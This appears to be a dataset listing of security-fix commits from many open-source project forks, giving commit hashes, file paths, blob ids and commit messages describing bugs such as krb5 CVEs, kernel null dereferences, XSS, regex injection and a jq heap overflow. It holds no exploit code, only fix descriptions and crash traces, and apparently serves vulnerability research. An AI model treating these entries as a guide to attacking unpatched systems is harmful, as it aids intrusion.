Projects:
    ALTUN69_PHP-Fusion
Commit Message for f1a5fce791e2392d5a23a6d62ab65c481cdd6a66:
Added char checks to robots.txt\n\nAdded char checks to robots.txt

======================================================================
Commit With Fix: 
    b8edbda019eeb99da8663193e224efc9d1265dc7
File(s) In Commit: 
    src/core/coreuserinputhandler.cpp
Blob(s) In Commit: 
    73aac48ae3cb8cfcba99ec943ca0cb1e57ed955c
Blob(s) Before Fix: 
    73aac48ae3cb8cfcba99ec943ca0cb1e57ed955c
Projects:
    02JanDal_quassel
Commit Message for b8edbda019eeb99da8663193e224efc9d1265dc7:
Merge pull request #153 from elxa/fix-op-command-crashing-core\n\nFixes a crash of the core when executing "/op *" in a query.

======================================================================
Commit With Fix: 
    09ccfd238e5a0e670d8178cf50180ea81ae09ae1
File(s) In Commit: 
    drivers/net/ppp/pptp.c
Blob(s) In Commit: 
    597c53e0a2ecce6a7fecaaf5032006f31795b307
Blob(s) Before Fix: 
    597c53e0a2ecce6a7fecaaf5032006f31795b307
Projects:
    0-T-0_ps4-linux
Commit Message for 09ccfd238e5a0e670d8178cf50180ea81ae09ae1:
pptp: verify sockaddr_len in pptp_bind() and pptp_connect()\n\nReported-by: Dmitry Vyukov <dvyukov@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5233252fce714053f0151680933571a2da9cbfb4
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    f52bcbf2e58cd8b8ded4c3d65c8dd9b87034b002
Blob(s) Before Fix: 
    f52bcbf2e58cd8b8ded4c3d65c8dd9b87034b002
Projects:
    0-T-0_ps4-linux
Commit Message for 5233252fce714053f0151680933571a2da9cbfb4:
bluetooth: Validate socket address length in sco_sock_bind().\n\nSigned-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b101a6bbd4f2181c360bd38e7683df4a03cba83e
File(s) In Commit: 
    Zend/zend_execute_API.c
Blob(s) In Commit: 
    fdffed34b275775084eeaf943a12c992edac2e0c
Blob(s) Before Fix: 
    fdffed34b275775084eeaf943a12c992edac2e0c
Projects:
    0014593_php-src
Commit Message for b101a6bbd4f2181c360bd38e7683df4a03cba83e:
Use format string

======================================================================
Commit With Fix: 
    df17a1224a3406f57477bcd372c61e04c0e5a5bb
File(s) In Commit: 
    src/lib/kadm5/kadm_rpc_xdr.c
Blob(s) In Commit: 
    ba670841056f1ede0929281e28e61e722e1fa990
Blob(s) Before Fix: 
    ba670841056f1ede0929281e28e61e722e1fa990
Projects:
    3van_krb5
Commit Message for df17a1224a3406f57477bcd372c61e04c0e5a5bb:
Verify decoded kadmin C strings [CVE-2015-8629]\n\nIn xdr_nullstring(), check that the decoded string is terminated with a zero byte and does not contain any internal zero bytes.\n\nCVE-2015-8629:\n\nIn all versions of MIT krb5, an authenticated attacker can cause kadmind to read beyond the end of allocated memory by sending a string without a terminating zero byte.  Information leakage may be possible for an attacker with permission to modify the database.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C\n\nticket: 8341 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    b863de7fbf080b15e347a736fdda0a82d42f4f6b
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    1d4365c836fb43c3979f0292460e077f480335fa
Blob(s) Before Fix: 
    1d4365c836fb43c3979f0292460e077f480335fa
Projects:
    3van_krb5
Commit Message for b863de7fbf080b15e347a736fdda0a82d42f4f6b:
Check for null kadm5 policy name [CVE-2015-8630]\n\nIn kadm5_create_principal_3() and kadm5_modify_principal(), check for entry->policy being null when KADM5_POLICY is included in the mask.\n\nCVE-2015-8630:\n\nIn MIT krb5 1.12 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying a null policy value but including KADM5_POLICY in the mask.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8342 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    83ed75feba32e46f736fcce0d96a0445f29b96c2
File(s) In Commit: 
    src/kadmin/server/server_stubs.c
Blob(s) In Commit: 
    6ac797e2885f1a737b9de605bd1d19b363ea185a
Blob(s) Before Fix: 
    6ac797e2885f1a737b9de605bd1d19b363ea185a
Projects:
    3van_krb5
Commit Message for 83ed75feba32e46f736fcce0d96a0445f29b96c2:
Fix leaks in kadmin server stubs [CVE-2015-8631]\n\nIn each kadmind server stub, initialize the client_name and server_name variables, and release them in the cleanup handler.  Many of the stubs will otherwise leak the client and server name if krb5_unparse_name() fails.  Also make sure to free the prime_arg variables in rename_principal_2_svc(), or we can leak the first one if unparsing the second one fails.  Discovered by Simo Sorce.\n\nCVE-2015-8631:\n\nIn all versions of MIT krb5, an authenticated attacker can cause kadmind to leak memory by supplying a null principal name in a request which uses one.  Repeating these requests will eventually cause kadmind to exhaust all available memory.\n\n    CVSSv2 Vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8343 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    acff81ec2c79492b180fade3c2894425cd35a545
File(s) In Commit: 
    fs/overlayfs/inode.c
Blob(s) In Commit: 
    961284936917e69742f837463999c27e90defb43
Blob(s) Before Fix: 
    961284936917e69742f837463999c27e90defb43
Projects:
    0-T-0_ps4-linux
Commit Message for acff81ec2c79492b180fade3c2894425cd35a545:
ovl: fix permission checking for setattr\n\n[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr() away - instead of "copy verbatim with metadata" + "chmod/chown/utimes" (with the former being always safe and the latter failing in case of insufficient permissions) it tries to combine these two.  Note that copyup itself will have to do ->setattr() anyway  _that_ is where the elevated capabilities are right.  Having these two ->setattr() (one to set verbatim copy of metadata, another to do what overlayfs ->setattr() had been asked to do in the first place) combined is where it breaks.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    0d3181324c816bdf664ca5e1548dfe8eb05c54f8
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    81412531262cd4267f3d47536a92b1374487bac6
Blob(s) Before Fix: 
    81412531262cd4267f3d47536a92b1374487bac6
Projects:
    01viniciusmelo_dolibarr
Commit Message for 0d3181324c816bdf664ca5e1548dfe8eb05c54f8:
FIX #2857, #4291 & #4341 Escape GETPOST alpha data by default\n\nThis should mitigate most HTML injections allowing XSS.

======================================================================
Commit With Fix: 
    6058483d9fbc1b904d5ae7cfea47bfcde5c5b559
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    14305ccab2f49a2a4e94f94ee67dc543c34e92c2
Blob(s) Before Fix: 
    14305ccab2f49a2a4e94f94ee67dc543c34e92c2
Projects:
    0x277F_inspircd
Commit Message for 6058483d9fbc1b904d5ae7cfea47bfcde5c5b559:
Reject replies to DNS PTR requests that contain invalid characters\n\nFixes issue #1033 reported by @ping86

======================================================================
Commit With Fix: 
    18e3b739fdc826481c6a1335ce0c5b19b3d415da
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    43bace809be7dfb5c23c893ff3ae0d22b42efffa
Blob(s) Before Fix: 
    43bace809be7dfb5c23c893ff3ae0d22b42efffa
Projects:
    0-T-0_ps4-linux
Commit Message for 18e3b739fdc826481c6a1335ce0c5b19b3d415da:
NFS: Fix a NULL pointer dereference of migration recovery ops for v4.2 client\n\n---Steps to Reproduce-- <nfs-server> # cat /etc/exports /nfs/referal  *(rw,insecure,no_subtree_check,no_root_squash,crossmnt) /nfs/old      *(ro,insecure,subtree_check,root_squash,crossmnt)\n\n<nfs-client> # mount -t nfs nfs-server:/nfs/ /mnt/ # ll /mnt/*/\n\n<nfs-server> # cat /etc/exports /nfs/referal   *(rw,insecure,no_subtree_check,no_root_squash,crossmnt,refer=/nfs/old/@nfs-server) /nfs/old       *(ro,insecure,subtree_check,root_squash,crossmnt) # service nfs restart\n\n<nfs-client> # ll /mnt/*/    --->>>>> oops here\n\n[ 5123.102925] BUG: unable to handle kernel NULL pointer dereference at           (null) [ 5123.103363] IP: [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.103752] PGD 587b9067 PUD 3cbf5067 PMD 0 [ 5123.104131] Oops: 0000 [#1] [ 5123.104529] Modules linked in: nfsv4(OE) nfs(OE) fscache(E) nfsd(OE) xfs libcrc32c iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi coretemp crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel ppdev vmw_balloon parport_pc parport i2c_piix4 shpchp auth_rpcgss nfs_acl vmw_vmci lockd grace sunrpc vmwgfx drm_kms_helper ttm drm mptspi serio_raw scsi_transport_spi e1000 mptscsih mptbase ata_generic pata_acpi [last unloaded: nfsd] [ 5123.105887] CPU: 0 PID: 15853 Comm: ::1-manager Tainted: G           OE   4.2.0-rc6+ #214 [ 5123.106358] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/20/2014 [ 5123.106860] task: ffff88007620f300 ti: ffff88005877c000 task.ti: ffff88005877c000 [ 5123.107363] RIP: 0010:[<ffffffffa03ed38b>]  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.107909] RSP: 0018:ffff88005877fdb8  EFLAGS: 00010246 [ 5123.108435] RAX: ffff880053f3bc00 RBX: ffff88006ce6c908 RCX: ffff880053a0d240 [ 5123.108968] RDX: ffffea0000e6d940 RSI: ffff8800399a0000 RDI: ffff88006ce6c908 [ 5123.109503] RBP: ffff88005877fe28 R08: ffffffff81c708a0 R09: 0000000000000000 [ 5123.110045] R10: 00000000000001a2 R11: ffff88003ba7f5c8 R12: ffff880054c55800 [ 5123.110618] R13: 0000000000000000 R14: ffff880053a0d240 R15: ffff880053a0d240 [ 5123.111169] FS:  0000000000000000(0000) GS:ffffffff81c27000(0000) knlGS:0000000000000000 [ 5123.111726] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [ 5123.112286] CR2: 0000000000000000 CR3: 0000000054cac000 CR4: 00000000001406f0 [ 5123.112888] Stack: [ 5123.113458]  ffffea0000e6d940 ffff8800399a0000 00000000000167d0 0000000000000000 [ 5123.114049]  0000000000000000 0000000000000000 0000000000000000 00000000a7ec82c6 [ 5123.114662]  ffff88005877fe18 ffffea0000e6d940 ffff8800399a0000 ffff880054c55800 [ 5123.115264] Call Trace: [ 5123.115868]  [<ffffffffa03fb44b>] nfs4_try_migration+0xbb/0x220 [nfsv4] [ 5123.116487]  [<ffffffffa03fcb3b>] nfs4_run_state_manager+0x4ab/0x7b0 [nfsv4] [ 5123.117104]  [<ffffffffa03fc690>] ? nfs4_do_reclaim+0x510/0x510 [nfsv4] [ 5123.117813]  [<ffffffff810a4527>] kthread+0xd7/0xf0 [ 5123.118456]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160 [ 5123.119108]  [<ffffffff816d9cdf>] ret_from_fork+0x3f/0x70 [ 5123.119723]  [<ffffffff810a4450>] ? kthread_worker_fn+0x160/0x160 [ 5123.120329] Code: 4c 8b 6a 58 74 17 eb 52 48 8d 55 a8 89 c6 4c 89 e7 e8 4a b5 ff ff 8b 45 b0 85 c0 74 1c 4c 89 f9 48 8b 55 90 48 8b 75 98 48 89 df <41> ff 55 00 3d e8 d8 ff ff 41 89 c6 74 cf 48 8b 4d c8 65 48 33 [ 5123.121643] RIP  [<ffffffffa03ed38b>] nfs4_proc_get_locations+0x9b/0x120 [nfsv4] [ 5123.122308]  RSP <ffff88005877fdb8> [ 5123.122942] CR2: 0000000000000000\n\nFixes: ec011fe847 ("NFS: Introduce a vector of migration recovery ops") Cc: stable@vger.kernel.org # v3.13+ Signed-off-by: Kinglong Mee <kinglongmee@gmail.com> Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>

======================================================================
Commit With Fix: 
    bcaf452e516c02c9bed584a73736431c5e8831f1
File(s) In Commit: 
    radicale/storage/multifilesystem.py
Blob(s) In Commit: 
    93cec8743ee707e3ecd82ab15244f7dc263725e2
Blob(s) Before Fix: 
    93cec8743ee707e3ecd82ab15244f7dc263725e2
Projects:
    Aeysol_Radicale
Commit Message for bcaf452e516c02c9bed584a73736431c5e8831f1:
Convert component names safely to filenames Component names are controlled by the user and without this checks access to arbitrary files is possible if the multifilesystem backend is used.

======================================================================
Commit With Fix: 
    4bfe7c9f7991d534c8b9fbe153af9d341f925f98
File(s) In Commit: 
    radicale/rights/regex.py
Blob(s) In Commit: 
    39c39ae3701d3a5f81846d460ec28fe7191552e3
Blob(s) Before Fix: 
    39c39ae3701d3a5f81846d460ec28fe7191552e3
Projects:
    Aeysol_Radicale
Commit Message for 4bfe7c9f7991d534c8b9fbe153af9d341f925f98:
Prevent "regex injection"\n\nIf an attacker is able to authenticate with a user name like .* he can bypass limitations imposed by "owner_write" and "owner_only".

======================================================================
Commit With Fix: 
    651e150091c61fb60ad1dff2bc2166185a83d9d6
File(s) In Commit: 
    symphony/content/content.systempreferences.php
Blob(s) In Commit: 
    a1cf73d59fc5fa9230fb17ec86a5c89ea2795cff
Blob(s) Before Fix: 
    a1cf73d59fc5fa9230fb17ec86a5c89ea2795cff
Projects:
    1900_symphony-2
Commit Message for 651e150091c61fb60ad1dff2bc2166185a83d9d6:
Sanitize the POST for the system/preferences/

======================================================================
Commit With Fix: 
    635682a14427d241bab7bbdeebb48a7d7b91638e
File(s) In Commit: 
    net/sctp/sm_sideeffect.c
Blob(s) In Commit: 
    6098d4c42fa91287d3cde36ac05d860f76d4fe32
Blob(s) Before Fix: 
    6098d4c42fa91287d3cde36ac05d860f76d4fe32
Projects:
    0-T-0_ps4-linux
Commit Message for 635682a14427d241bab7bbdeebb48a7d7b91638e:
sctp: Prevent soft lockup when sctp_accept() is called during a timeout event\n\nA case can occur when sctp_accept() is called by the user during a heartbeat timeout event after the 4-way handshake.  Since sctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the bh_sock_lock in sctp_generate_heartbeat_event() will be taken with the listening socket but released with the new association socket. The result is a deadlock on any future attempts to take the listening socket lock.\n\nNote that this race can occur with other SCTP timeouts that take the bh_lock_sock() in the event sctp_accept() is called.\n\n BUG: soft lockup - CPU#9 stuck for 67s! [swapper:0]  ...  RIP: 0010:[<ffffffff8152d48e>]  [<ffffffff8152d48e>] _spin_lock+0x1e/0x30  RSP: 0018:ffff880028323b20  EFLAGS: 00000206  RAX: 0000000000000002 RBX: ffff880028323b20 RCX: 0000000000000000  RDX: 0000000000000000 RSI: ffff880028323be0 RDI: ffff8804632c4b48  RBP: ffffffff8100bb93 R08: 0000000000000000 R09: 0000000000000000  R10: ffff880610662280 R11: 0000000000000100 R12: ffff880028323aa0  R13: ffff8804383c3880 R14: ffff880028323a90 R15: ffffffff81534225  FS:  0000000000000000(0000) GS:ffff880028320000(0000) knlGS:0000000000000000  CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b  CR2: 00000000006df528 CR3: 0000000001a85000 CR4: 00000000000006e0  DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000  DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400  Process swapper (pid: 0, threadinfo ffff880616b70000, task ffff880616b6cab0)  Stack:  ffff880028323c40 ffffffffa01c2582 ffff880614cfb020 0000000000000000  <d> 0100000000000000 00000014383a6c44 ffff8804383c3880 ffff880614e93c00  <d> ffff880614e93c00 0000000000000000 ffff8804632c4b00 ffff8804383c38b8  Call Trace:  <IRQ>  [<ffffffffa01c2582>] ? sctp_rcv+0x492/0xa10 [sctp]  [<ffffffff8148c559>] ? nf_iterate+0x69/0xb0  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148c716>] ? nf_hook_slow+0x76/0x120  [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8149757d>] ? ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497808>] ? ip_local_deliver+0x98/0xa0  [<ffffffff81496ccd>] ? ip_rcv_finish+0x12d/0x440  [<ffffffff81497255>] ? ip_rcv+0x275/0x350  [<ffffffff8145cfeb>] ? __netif_receive_skb+0x4ab/0x750  ...\n\nWith lockdep debugging:\n\n =====================================  [ BUG: bad unlock balance detected! ]  -------------------------------------  CslRx/12087 is trying to release lock (slock-AF_INET) at:  [<ffffffffa01bcae0>] sctp_generate_timeout_event+0x40/0xe0 [sctp]  but there are no more locks to release!\n\n other info that might help us debug this:  2 locks held by CslRx/12087:  #0:  (&asoc->timers[i]){+.-...}, at: [<ffffffff8108ce1f>] run_timer_softirq+0x16f/0x3e0  #1:  (slock-AF_INET){+.-...}, at: [<ffffffffa01bcac3>] sctp_generate_timeout_event+0x23/0xe0 [sctp]\n\nEnsure the socket taken is also the same one that is released by saving a copy of the socket before entering the timeout event critical section.\n\nSigned-off-by: Karl Heiss <kheiss@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3ca8138f014a913f98e6ef40e939868e1e9ea876
File(s) In Commit: 
    fs/fuse/file.c
Blob(s) In Commit: 
    195476a24148ba01d6609b72f60c98596d2065e1
Blob(s) Before Fix: 
    195476a24148ba01d6609b72f60c98596d2065e1
Projects:
    0-T-0_ps4-linux
Commit Message for 3ca8138f014a913f98e6ef40e939868e1e9ea876:
fuse: break infinite loop in fuse_fill_write_pages()\n\nI got a report about unkillable task eating CPU. Further investigation shows, that the problem is in the fuse_fill_write_pages() function. If iov's first segment has zero length, we get an infinite loop, because we never reach iov_iter_advance() call.\n\nFix this by calling iov_iter_advance() before repeating an attempt to copy data from userspace.\n\nA similar problem is described in 124d3b7041f ("fix writev regression: pan hanging unkillable and un-straceable"). If zero-length segmend is followed by segment with invalid address, iov_iter_fault_in_readable() checks only first segment (zero-length), iov_iter_copy_from_user_atomic() skips it, fails at second and returns zero -> goto again without skipping zero-length segment.\n\nPatch calls iov_iter_advance() before goto again: we'll skip zero-length segment at second iteraction and iov_iter_fault_in_readable() will detect invalid address.\n\nSpecial thanks to Konstantin Khlebnikov, who helped a lot with the commit description.\n\nCc: Andrew Morton <akpm@linux-foundation.org> Cc: Maxim Patlasov <mpatlasov@parallels.com> Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru> Signed-off-by: Roman Gushchin <klamm@yandex-team.ru> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: ea9b9907b82a ("fuse: implement perform_write") Cc: <stable@vger.kernel.org>

======================================================================
Commit With Fix: 
    94f9cd81436c85d8c3a318ba92e236ede73752fc
File(s) In Commit: 
    net/netfilter/nf_nat_redirect.c
Blob(s) In Commit: 
    d43869879fcfcea6ca23e3a579bd21f8aa855b10
Blob(s) Before Fix: 
    d43869879fcfcea6ca23e3a579bd21f8aa855b10
Projects:
    0-T-0_ps4-linux
Commit Message for 94f9cd81436c85d8c3a318ba92e236ede73752fc:
netfilter: nf_nat_redirect: add missing NULL pointer check\n\nCommit 8b13eddfdf04cbfa561725cfc42d6868fe896f56 ("netfilter: refactor NAT redirect IPv4 to use it from nf_tables") has introduced a trivial logic change which can result in the following crash.\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000030 IP: [<ffffffffa033002d>] nf_nat_redirect_ipv4+0x2d/0xa0 [nf_nat_redirect] PGD 3ba662067 PUD 3ba661067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: ipv6(E) xt_REDIRECT(E) nf_nat_redirect(E) xt_tcpudp(E) iptable_nat(E) nf_conntrack_ipv4(E) nf_defrag_ipv4(E) nf_nat_ipv4(E) nf_nat(E) nf_conntrack(E) ip_tables(E) x_tables(E) binfmt_misc(E) xfs(E) libcrc32c(E) evbug(E) evdev(E) psmouse(E) i2c_piix4(E) i2c_core(E) acpi_cpufreq(E) button(E) ext4(E) crc16(E) jbd2(E) mbcache(E) dm_mirror(E) dm_region_hash(E) dm_log(E) dm_mod(E) CPU: 0 PID: 2536 Comm: ip Tainted: G            E   4.1.7-15.23.amzn1.x86_64 #1 Hardware name: Xen HVM domU, BIOS 4.2.amazon 05/06/2015 task: ffff8800eb438000 ti: ffff8803ba664000 task.ti: ffff8803ba664000 [...] Call Trace:  <IRQ>  [<ffffffffa0334065>] redirect_tg4+0x15/0x20 [xt_REDIRECT]  [<ffffffffa02e2e99>] ipt_do_table+0x2b9/0x5e1 [ip_tables]  [<ffffffffa0328045>] iptable_nat_do_chain+0x25/0x30 [iptable_nat]  [<ffffffffa031777d>] nf_nat_ipv4_fn+0x13d/0x1f0 [nf_nat_ipv4]  [<ffffffffa0328020>] ? iptable_nat_ipv4_fn+0x20/0x20 [iptable_nat]  [<ffffffffa031785e>] nf_nat_ipv4_in+0x2e/0x90 [nf_nat_ipv4]  [<ffffffffa03280a5>] iptable_nat_ipv4_in+0x15/0x20 [iptable_nat]  [<ffffffff81449137>] nf_iterate+0x57/0x80  [<ffffffff814491f7>] nf_hook_slow+0x97/0x100  [<ffffffff814504d4>] ip_rcv+0x314/0x400\n\nunsigned int nf_nat_redirect_ipv4(struct sk_buff *skb, ... { ... 		rcu_read_lock()  		indev = __in_dev_get_rcu(skb->dev)  		if (indev != NULL) { 			ifa = indev->ifa_list  			newdst = ifa->ifa_local  <--- 		} 		rcu_read_unlock()  ... }\n\nBefore the commit, 'ifa' had been always checked before access. After the commit, however, it could be accessed even if it's NULL. Interestingly, this was once fixed in 2003.\n\nhttp://marc.info/?l=netfilter-devel&m=106668497403047&w=2\n\nIn addition to the original one, we have seen the crash when packets that need to be redirected somehow arrive on an interface which hasn't been yet fully configured.\n\nThis change just reverts the logic to the old behavior to avoid the crash.\n\nFixes: 8b13eddfdf04 ("netfilter: refactor NAT redirect IPv4 to use it from nf_tables") Signed-off-by: Munehisa Kamata <kamatam@amazon.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    11d74fa5a22fe626c5e5a010b703cd46a136f253
File(s) In Commit: 
    framework/Core/lib/Horde/Core/Ui/VarRenderer/Html.php
Blob(s) In Commit: 
    580dc27409d2373d8827f190549d90a82d840e6d
Blob(s) Before Fix: 
    580dc27409d2373d8827f190549d90a82d840e6d
Projects:
    1sn0m4d_horde
Commit Message for 11d74fa5a22fe626c5e5a010b703cd46a136f253:
Escape form value.\n\nEven though this is a numeric field, this isn't enforced until the form is submitted.

======================================================================
Commit With Fix: 
    67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3
File(s) In Commit: 
    drivers/infiniband/hw/cxgb3/iwch_cm.c
Blob(s) In Commit: 
    f504ba73e5dc27200c988f342ee3d6423072ee9e
Blob(s) Before Fix: 
    f504ba73e5dc27200c988f342ee3d6423072ee9e
Projects:
    0-T-0_ps4-linux
Commit Message for 67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3:
iw_cxgb3: Fix incorrectly returning error on success\n\nThe cxgb3_*_send() functions return NET_XMIT_ values, which are positive integers values. So don't treat positive return values as an error.\n\nSigned-off-by: Steve Wise <swise@opengridcomputing.com> Signed-off-by: Hariprasad Shenai <hariprasad@chelsio.com> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    924a016ffe7ae7ea6d516c07a7852f0095eddbce
File(s) In Commit: 
    src/Umbraco.Web/umbraco.presentation/umbraco/dashboard/FeedProxy.aspx.cs
Blob(s) In Commit: 
    b304cda0b6ac37b71776a80e89e458cde486416f
Blob(s) Before Fix: 
    b304cda0b6ac37b71776a80e89e458cde486416f
Projects:
    0Neji_Umbraco-CMS
Commit Message for 924a016ffe7ae7ea6d516c07a7852f0095eddbce:
Fixes U4-7457 Server side request forgery (xsrf) in feedproxy.aspx

======================================================================
Commit With Fix: 
    e50293ef9775c5f1cf3fcc093037dd6a8c5684ea
File(s) In Commit: 
    drivers/usb/core/hub.c
Blob(s) In Commit: 
    ddbf32d599cba4e51aeb81eea8519500a8bbea01
Blob(s) Before Fix: 
    ddbf32d599cba4e51aeb81eea8519500a8bbea01
Projects:
    0-T-0_ps4-linux
Commit Message for e50293ef9775c5f1cf3fcc093037dd6a8c5684ea:
USB: fix invalid memory access in hub_activate()\n\nCommit 8520f38099cc ("USB: change hub initialization sleeps to delayed_work") changed the hub_activate() routine to make part of it run in a workqueue.  However, the commit failed to take a reference to the usb_hub structure or to lock the hub interface while doing so.  As a result, if a hub is plugged in and quickly unplugged before the work routine can run, the routine will try to access memory that has been deallocated.  Or, if the hub is unplugged while the routine is running, the memory may be deallocated while it is in active use.\n\nThis patch fixes the problem by taking a reference to the usb_hub at the start of hub_activate() and releasing it at the end (when the work is finished), and by locking the hub interface while the work routine is running.  It also adds a check at the start of the routine to see if the hub has already been disconnected, in which nothing should be done.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu> Reported-by: Alexandru Cornea <alexandru.cornea@intel.com> Tested-by: Alexandru Cornea <alexandru.cornea@intel.com> Fixes: 8520f38099cc ("USB: change hub initialization sleeps to delayed_work") CC: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    afae249efa4774c6676738ac5de6aeb4daf4889f
File(s) In Commit: 
    tmpfiles.d/systemd.conf.m4
Blob(s) In Commit: 
    0575408dbe21729c07b328aaa539e430300e5ba0
Blob(s) Before Fix: 
    0575408dbe21729c07b328aaa539e430300e5ba0
Projects:
    0x277F_systemd
Commit Message for afae249efa4774c6676738ac5de6aeb4daf4889f:
tmpfiles: set acls on system.journal explicitly\n\nhttps://github.com/systemd/systemd/issues/1397

======================================================================
Commit With Fix: 
    7f821fc9c77a9b01fe7b1d6e72717b33d8d64142
File(s) In Commit: 
    arch/powerpc/kernel/process.c
Blob(s) In Commit: 
    646bf4d222c1caeda5c7851de74fbbe0ad0d65d9
Blob(s) Before Fix: 
    646bf4d222c1caeda5c7851de74fbbe0ad0d65d9
Projects:
    0-T-0_ps4-linux
Commit Message for 7f821fc9c77a9b01fe7b1d6e72717b33d8d64142:
powerpc/tm: Check for already reclaimed tasks\n\nCurrently we can hit a scenario where we'll tm_reclaim() twice.  This results in a TM bad thing exception because the second reclaim occurs when not in suspend mode.\n\nThe scenario in which this can happen is the following.  We attempt to deliver a signal to userspace.  To do this we need obtain the stack pointer to write the signal context.  To get this stack pointer we must tm_reclaim() in case we need to use the checkpointed stack pointer (see get_tm_stackpointer()).  Normally we'd then return directly to userspace to deliver the signal without going through __switch_to().\n\nUnfortunatley, if at this point we get an error (such as a bad userspace stack pointer), we need to exit the process.  The exit will result in a __switch_to().  __switch_to() will attempt to save the process state which results in another tm_reclaim().  This tm_reclaim() now causes a TM Bad Thing exception as this state has already been saved and the processor is no longer in TM suspend mode. Whee!\n\nThis patch checks the state of the MSR to ensure we are TM suspended before we attempt the tm_reclaim().  If we've already saved the state away, we should no longer be in TM suspend mode.  This has the additional advantage of checking for a potential TM Bad Thing exception.\n\nFound using syscall fuzzer.\n\nFixes: fb09692e71f1 ("powerpc: Add reclaim and recheckpoint functions for context switching transactional memory processes") Cc: stable@vger.kernel.org # v3.9+ Signed-off-by: Michael Neuling <mikey@neuling.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    8eb1367ca44e772963e704a700ef72ae2e12babd
File(s) In Commit: 
    src/jv_parse.c
Blob(s) In Commit: 
    84245b867e5d8a1f1fc4e22cb1ee46e53da075df
Blob(s) Before Fix: 
    84245b867e5d8a1f1fc4e22cb1ee46e53da075df
Projects:
    0xflotus_jq
Commit Message for 8eb1367ca44e772963e704a700ef72ae2e12babd:
Heap buffer overflow in tokenadd() (fix #105)\n\nThis was an off-by one: the NUL terminator byte was not allocated on resize.  This was triggered by JSON-encoded numbers longer than 256 bytes.

======================================================================
Commit With Fix: 
    6713ca45e7757297381f4b4cdb9cf5e624a9ad36
File(s) In Commit: 
    src/funcs.c
Blob(s) In Commit: 
    b7160cc73474ce8d85903a6bfccaec5162c7919b
Blob(s) Before Fix: 
    b7160cc73474ce8d85903a6bfccaec5162c7919b
Projects:
    5hadowblad3_file
Commit Message for 6713ca45e7757297381f4b4cdb9cf5e624a9ad36:
PR/454: Fix memory corruption when the continuation level jumps by more than 20 in a single step.

======================================================================
Commit With Fix: 
    940100c28ae28931722290794889cf84a92c5f6f
File(s) In Commit: 
    src/lib/openjp2/j2k.c
Blob(s) In Commit: 
    d487d89d7c6a63b660dc6f583864d784c803af4f
Blob(s) Before Fix: 
    d487d89d7c6a63b660dc6f583864d784c803af4f
Projects:
    01bui_openjpeg
Commit Message for 940100c28ae28931722290794889cf84a92c5f6f:
Fix potential use-after-free in opj_j2k_write_mco function\n\nFixes #563

======================================================================
Commit With Fix: 
    07908124838afcc99c577d1d3e84cef2dbd39cb7
File(s) In Commit: 
    src/fat.c
Blob(s) In Commit: 
    845b748dbe1d9f676f70235fe24352da324524af
Blob(s) Before Fix: 
    845b748dbe1d9f676f70235fe24352da324524af
Projects:
    10100010meow_dosfstools
Commit Message for 07908124838afcc99c577d1d3e84cef2dbd39cb7:
